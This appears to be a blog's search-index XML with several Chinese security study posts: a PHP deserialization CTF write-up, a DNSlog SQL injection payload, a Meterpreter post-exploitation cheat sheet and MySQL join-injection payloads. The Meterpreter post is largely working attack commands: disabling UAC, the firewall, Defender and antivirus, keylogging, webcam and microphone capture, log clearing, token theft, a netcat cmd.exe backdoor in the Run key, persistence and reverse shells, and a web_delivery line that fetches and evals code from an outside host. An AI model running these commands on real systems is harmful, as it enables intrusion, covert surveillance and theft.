<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF反序列字符串逃逸</title>
    <url>/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>刷了一下CTF反序列化的题，去年没有好好了解。又补了一次PHP，害太菜了。每天看看别人的博客真的可以鼓舞人。简单记录一下两道字符串逃逸问题</p>
<p>推荐一个反序列化总结的很好的笔记<a href="https://www.cnblogs.com/wjrblogs/p/12800358.html">https://www.cnblogs.com/wjrblogs/p/12800358.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//变长 直接构造多个关键词，这样就能逃出几个字符</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">255</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>],</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    @unserialize(waf(serialize(<span class="variable">$a</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag-&gt;index 长度增加1 逃逸的长度为49 所以需要49的flag<br><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code><br>(waf(serialize($a))   ——   flag index 替换了所以[flag.php]要用16进制 然后 s:8  其中S必须大写才会存在16进制<br><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;\66\6c\61\67\2E\70\68\70&quot;;&#125;&#125;</code> //  i:0 键名无所谓已近到下一层了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//变短 通过键逃逸和值逃逸--------分析思路 先分析再做题 不然思路真的很乱</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter_arr</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>) &#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$serialize_info = filter(serialize($_SESSION)); 序列化 SESSION<strong>数组</strong>并且过滤 然后看到$function == ‘phpinfo’<br>我们去phpinfo查看很容易看到d0g3_f1ag.php和PHP处理器<br>但是这个题目里没有读取session文件，这个题只是把$SESSION<strong>数组</strong>进行了serialize().这种地方不要因为看到php处理器而犯迷糊。</p>
<p>所以我们大概明确了就是<br><code>$userinfo[&#39;img&#39;]=d0g3_f1ag.php 或者 base64_decode($userinfo[&#39;img&#39;])=ZDBnM19mMWFnLnBocA==即可</code></p>
<p>其中$_SESSION[‘user’]之后有一个extract($_POST); 根据extract()我们可以进行变量覆盖<br>extract() 函数从数组中将变量导入到当前的符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;funtion&quot;</span>] = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line">请求?_SESSION[test]=xxx</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;xxx&#x27;</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>值逃逸：需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对~~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;  <span class="comment">//后面加的是为了键和值保持一致 随便 加前面用_SESSION[xx]=xxx同理</span></span><br></pre></td></tr></table></figure>

<p>这样我们需要把下一个的键和值当成第一个的值， x代表数字 下一个的值和键需要多少位 然后flag构造多少 因为flag-&gt;NULL了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag   ==&gt;  s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:x:<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>  其中最后一个”会给下一个键一起成为上一个的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>   ==&gt;  <span class="title">s</span>:7:<span class="title">function</span></span>;s:x:<span class="string">&quot;&quot;</span> </span><br><span class="line"> s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a]&quot;</span>  <span class="comment">//括号是值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//键逃逸`，这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~</span></span><br><span class="line">_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;flagphp [&quot;</span>;s:<span class="number">67</span>:] <span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>过滤的键然后他的值的属性 成为键的值  先计算键的值然后再去构造键。然后查看源代码 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">将/d0g3_fllllllag base64编码就好。</span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://blog.csdn.net/a3320315/article/details/104118688/">https://blog.csdn.net/a3320315/article/details/104118688/</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSlog注入</title>
    <url>/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>文章推荐:</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/98096">https://www.anquanke.com/post/id/98096</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/10623583.html">https://www.cnblogs.com/-qing-/p/10623583.html</a></p>
</blockquote>
<p>推荐平台:</p>
<blockquote>
<p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  //不需要登录账户注册 速度快一点 简单测试推荐</p>
<p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
<p><a href="http://ceye.io/">http://ceye.io</a></p>
</blockquote>
<blockquote>
<p>payload:</p>
<p>and if((select load_file(concat(‘//‘,(语句 limit 0,1),’.xxxx.dnslog.cn\aaa’))),1,1)–+</p>
</blockquote>
<p>BugscanTeam 项目现已开源，项目地址：<br><a href="https://github.com/bugscanteam/dnslog/">https://github.com/bugscanteam/dnslog/</a></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Meterpreter后渗透</title>
    <url>/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<center>仅此记录自己的学习笔记罢了。持续更新本文章</center>

<p>Msf后渗透测试阶段做什么</p>
<ul>
<li>-提权</li>
<li>-信息收集</li>
<li>-渗透内网</li>
<li>-永久后门</li>
</ul>
<p>在meterpreter中首先要获取system账号权限<br>-load priv -getsystem<br>▪ priv_elevate_getsystem: Operation failed: Access is denied. //说明有UAC限制</p>
<h1 id="绕过UAC限制"><a href="#绕过UAC限制" class="headerlink" title="绕过UAC限制"></a>绕过UAC限制</h1><p>use exploit/windows/local/ask //就是需要请求ask同意我才能执行’ VNC去访问那种<br>▪ set session<br>▪ set filename<br><img src="https://tva2.sinaimg.cn/large/008gTZraly1gork2plqh3j30xc0fvwmh.jpg" alt="2064441-20210202144651704-921871329"></p>
<p>此时session会多出来一个新的具有system权限的session //这种方法就不是一定成功的</p>
<p>use exploit/windows/local/bypassuac</p>
<p>使用它即可上传一个exe直接bypass UAC !<br><img src="https://tva2.sinaimg.cn/large/008gTZraly1gork1rrh3oj30op0bx3za.jpg" alt="2064441-20210202144855371-1848364274"></p>
<p>use exploit/windows/local/bypassuac_injection</p>
<p>是上传一个dll注入bypass的 如果他不是Administrator组的 那么就需要直接利用漏洞直接提权</p>
<p>use exploit/windows/local/ 利用本地系统漏洞然后提权 //</p>
<p>migrate 将你的shell进程迁移到另一个进程中 //getsystem不成功 可能需要将他转移到其他的系统进程即可</p>
<h2 id="图形化payload"><a href="#图形化payload" class="headerlink" title="图形化payload"></a>图形化payload</h2><p>– set payload windows/vncinject/reverse_tcp – set viewonly no //就可以直接VNC操作</p>
<p>Psexec 模块之 Passthehash 可以直接hash登录</p>
<p>加载kiwi模块以前的mimikatz然后可以抓取当前的明文密码</p>
<p>use exploit/windows/smb/psexec 设置相应的smbuser和smbpass 但是需要提前关闭UAC</p>
<h2 id="关闭UAC"><a href="#关闭UAC" class="headerlink" title="关闭UAC"></a>关闭UAC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line"></span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax1.sinaimg.cn/large/008gTZraly1gork3n1visj313n0f7jwx.jpg" alt="2064441-20210202145342267-1344473413"></p>
<p>我们可以看到是关闭了 但是需要重启</p>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– netsh advfirewall set allprofiles state off &#x2F;&#x2F;on是开启 关闭防火墙需要管理员或者system权限</span><br><span class="line">– net stop windefend &#x2F;&#x2F;关闭Windefend </span><br><span class="line">– manage-bde -off C:    &#x2F;&#x2F;Bitlocker磁盘加密</span><br><span class="line">– manage-bde -status C:</span><br><span class="line">– bcdedit.exe &#x2F;set &#123;current&#125; nx AlwaysOff &#x2F;&#x2F;关闭DEP</span><br><span class="line">– Run killav&#x2F;&#x2F;杀死防毒软件</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;killa</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;enable_rd&#x2F;&#x2F;开启远程桌面服务</span><br><span class="line">– run getgui –e</span><br><span class="line">▪ run getgui -u -p &#x2F;&#x2F;添加账号密码</span><br><span class="line">▪run multi_console_command -rc &#x2F;root&#x2F;.msf4&#x2F;logs&#x2F;scripts&#x2F;getgui&#x2F;clean_up__20160824.1855.rc &#x2F;&#x2F;关闭远程桌面 文件是开启自动生成的</span><br><span class="line">查看远程桌面</span><br><span class="line">– screenshot &#x2F;&#x2F;截图当前桌面‘ 清晰</span><br><span class="line">– use espia &#x2F;&#x2F;插件</span><br><span class="line">screengrab&#x2F;&#x2F;截取当前桌面’模糊一点</span><br><span class="line">webcam&#x2F;&#x2F;摄像头命令</span><br><span class="line">webcam_list &#x2F;&#x2F;查看摄像头 webcam_snap #通过摄像头拍照 </span><br><span class="line">webcam_stream #通过摄像头开启视频</span><br><span class="line">clearev &#x2F;&#x2F;清除windows中的应用程序日志、系统日志、安全日志</span><br><span class="line"></span><br><span class="line">enumdesktops    --&gt;列出所有可访问的桌面和窗口站（窗体列表）</span><br><span class="line">getdesktop      --&gt;得到当前的Meterpreter桌面</span><br><span class="line">idletime        --&gt;返回秒远程用户已经闲置数量</span><br><span class="line">keyscan_dump    --&gt;转储按键缓冲（下载键盘记录）</span><br><span class="line">keyscan_start   --&gt;开始捕获击键（开始键盘记录）</span><br><span class="line">keyscan_stop    --&gt;停止捕获击键（停止键盘记录）</span><br><span class="line">screenshot      --&gt;抓取交互式桌面截图（当前操作界面截图一张）</span><br><span class="line">uictl           --&gt;控制一些用户界面组件（获取键盘、鼠标控制权）</span><br><span class="line">使用uictl -h 查看帮助（打开&#x2F;关闭，键盘&#x2F;鼠标）</span><br><span class="line">PS：键盘记录注意点，先开始，后下载，再结束，否则会出错</span><br><span class="line">摄像头：Stdapi: Webcam Commands（摄像头命令）</span><br><span class="line">record_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）</span><br><span class="line">webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）</span><br><span class="line">webcam_list      --&gt;单摄像头（查看摄像头列表）</span><br><span class="line">webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）</span><br><span class="line">webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）</span><br></pre></td></tr></table></figure>
<h1 id="令牌操纵-incognito假冒令牌"><a href="#令牌操纵-incognito假冒令牌" class="headerlink" title="令牌操纵(incognito假冒令牌)"></a>令牌操纵(incognito假冒令牌)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito #help incognito 查看帮助 </span><br><span class="line">list_tokens -u #查看可用的token </span><br><span class="line">impersonate_token &#39;NT AUTHORITY\SYSTEM&#39; #假冒SYSTEM token </span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 </span><br><span class="line">需使用\\ execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell rev2self #返回原始token</span><br><span class="line">steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt; #从指定进程中窃取token 先ps drop_token #删除窃取的token</span><br></pre></td></tr></table></figure>

<h1 id="注册表添加NC后门服务-meterpreter"><a href="#注册表添加NC后门服务-meterpreter" class="headerlink" title="注册表添加NC后门服务(meterpreter)"></a>注册表添加NC后门服务(meterpreter)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\windows\\system32</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39; </span><br><span class="line">reg queryval -k HKLM\software\microsoft\windows\currentversion\Run - v nc &#x2F;&#x2F;查询是否加入到注册表了</span><br></pre></td></tr></table></figure>

<h2 id="Nc的一些用法"><a href="#Nc的一些用法" class="headerlink" title="Nc的一些用法"></a>Nc的一些用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里以Windows7为例，如果你们Windows7是64位那么文件到system32 会重定向到sysWOW64，因为Windows 64位版本上的%windir%\System32文件夹中没有32位内容。</span><br><span class="line">所以上面路径也要改了。 reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d &#39;C:\windows\sysWOW64\nc.exe -Ldp 444 -e cmd.exe&#39;</span><br><span class="line">这个和你生成的shellcode是有关系的。生成的shellcode是x64是不存在这种情况的 windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">ps:这个就需要关闭防火墙,但是为了更加隐蔽我们可以开启策略</span><br><span class="line">execute -f cmd -i -H &#x2F;&#x2F;执行cmd -H是隐蔽运行 -i是交互 这里用shell和这个还是有区别的 各位可以自己测试</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">netsh firewall show opmode&#x2F;&#x2F;检查是否开启防火墙</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;这个名字自己看着随便来&quot; ENABLE ALL &#x2F;&#x2F;添加策略</span><br></pre></td></tr></table></figure>

<p>抓包(meterpreter)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– load sniffer</span><br><span class="line">– sniffer_interfaces</span><br><span class="line">– sniffer_start 2</span><br><span class="line">– sniffer_dump 2 1.cap</span><br><span class="line">在内存中缓存区循环抓包(50000包)，不写硬盘</span><br><span class="line">只能过滤meterpreter流量，传输全过程SSL&#x2F;TLS加密</span><br></pre></td></tr></table></figure>

<h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一些协议 访问什么的 内容基本看不到</span><br><span class="line">– use auxiliary&#x2F;sniffer&#x2F;psnuffle</span><br><span class="line">– set PCAPFILE 1.cap</span><br></pre></td></tr></table></figure>

<p>set exitonsession 为false就是持续的 没连接一个就获得一个session</p>
<h1 id="POST模块"><a href="#POST模块" class="headerlink" title="POST模块"></a>POST模块</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;2.1.1.0&#x2F;24 &#x2F;&#x2F;arp嗅探</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;checkvm &#x2F;&#x2F;检查是否是虚拟机</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;credential_collector &#x2F;&#x2F;token</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_applications &#x2F;&#x2F; 装的软件</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users &#x2F;&#x2F;账号正处于登录状态</span><br><span class="line">– run post&#x2F;windows&#x2F;gather&#x2F;enum_snmp&#x2F;&#x2F;  snmp</span><br><span class="line">– run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester &#x2F;&#x2F;存在提权漏洞</span><br><span class="line">– run post&#x2F;windows&#x2F;manage&#x2F;delete_user USERNAME&#x3D;账号名字 &#x2F;&#x2F;删除账号</span><br><span class="line">– run post&#x2F;multi&#x2F;gather&#x2F;env &#x2F;&#x2F;环境配置</span><br></pre></td></tr></table></figure>

<h1 id="持久后门-meterpreter6的话是弃用这个脚本"><a href="#持久后门-meterpreter6的话是弃用这个脚本" class="headerlink" title="持久后门(meterpreter6的话是弃用这个脚本)"></a>持久后门(meterpreter6的话是弃用这个脚本)</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– run persistence -h</span><br><span class="line">– run persistence -X -i 10 -p 4444 -r 1.1.1.1</span><br><span class="line">– run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">– run persistence -S -i 20 -p 4444 -r 1.1.1.1</span><br></pre></td></tr></table></figure>

<p>use exploit/windows/local/persistence</p>
<p><img src="https://tvax1.sinaimg.cn/large/008gTZraly1gorkbtd6edj30rk0e8t9i.jpg" alt="2064441-20210205130840499-1872520915"></p>
<p>PHP shell 和 Web Delivery</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;3333 -f </span><br><span class="line">raw -o a.php</span><br><span class="line">MSF启动侦听</span><br><span class="line">上传WEB站点通过游览器访问</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;分割&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">–利用代码执行漏洞访问攻击者服务器 </span><br><span class="line">– use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery – set target 1 – php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F; fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure>

<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.portfwd</span><br><span class="line">portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</span><br><span class="line">常用参数：</span><br><span class="line">-l：本地监听端口</span><br><span class="line">-r：内网目标的ip</span><br><span class="line">-p：内网目标的端口</span><br><span class="line"></span><br><span class="line">上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</span><br><span class="line">2.pivot</span><br><span class="line">pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</span><br><span class="line">(1)首先需要在msf的操作界面下添加一个路由表。</span><br><span class="line">添加命令：route add 内网ip 子网掩码 session的id</span><br><span class="line">打印命令：route print</span><br><span class="line">路由添加成功之后就可以在msf里访问10.1.1.0&#x2F;24这个网段。</span><br><span class="line">(2)建立socks代理。</span><br><span class="line">如果其它程序需要访问这个内网环境，就可以建立socks代理。</span><br><span class="line">msf提供了3个模块用来做socks代理。</span><br><span class="line">auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks5</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks_unc</span><br><span class="line">以auxiliary&#x2F;server&#x2F;socks4a为例，查看需要设置的参数。</span><br><span class="line">一共两个参数：</span><br><span class="line">SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</span><br><span class="line">SRVPORT：监听的端口，默认为1080。</span><br><span class="line">直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用</span><br></pre></td></tr></table></figure>

<p>PS：<a href="https://blog.csdn.net/qq_42442326/article/details/105931598">MSF+内网穿透 实现远程渗透教程</a></p>
]]></content>
      <tags>
        <tag>meterpreter</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql_Join注入技巧</title>
    <url>/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="Join注入技巧"><a href="#Join注入技巧" class="headerlink" title="Join注入技巧"></a>Join注入技巧</h3><h4 id="join无名列报错注入"><a href="#join无名列报错注入" class="headerlink" title="join无名列报错注入"></a>join无名列报错注入</h4><p>约束条件</p>
<blockquote>
<p>在知到表名的前提下才能操作</p>
</blockquote>
<p>注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select * from (select * from users join users b using(id))c),0x7e))</span><br></pre></td></tr></table></figure>

<p>依次枚举即可</p>
<h4 id="Join代替order-by-过滤了逗号"><a href="#Join代替order-by-过滤了逗号" class="headerlink" title="Join代替order by [过滤了逗号]"></a>Join代替order by [过滤了逗号]</h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select * from (select 1) a join (select 2) b join (select 3) c%23</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr0lsqont2j30tu0a2js0.jpg" alt="JOIN"></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入技巧备忘录</title>
    <url>/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h2 id="MYSQL一些技巧"><a href="#MYSQL一些技巧" class="headerlink" title="MYSQL一些技巧"></a>MYSQL一些技巧</h2><blockquote>
<p>仅仅是作为自己备忘录，如果错误，敬请斧正。</p>
</blockquote>
